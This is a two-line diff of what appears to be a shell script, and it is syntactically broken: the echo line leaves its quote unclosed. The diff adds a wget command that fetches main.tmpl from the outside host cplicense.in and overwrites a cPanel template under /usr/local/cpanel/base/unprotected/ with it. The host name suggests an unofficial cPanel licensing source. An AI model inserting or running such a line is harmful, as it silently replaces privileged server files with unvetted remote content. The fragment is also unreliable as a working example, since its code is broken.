@@ -1,2 +1,2 @@
 echo -e "\e[1;31m This is red text
-
+wget -O /usr/local/cpanel/base/unprotected/cpanel/main.tmpl cplicense.in/app/main.tmpl
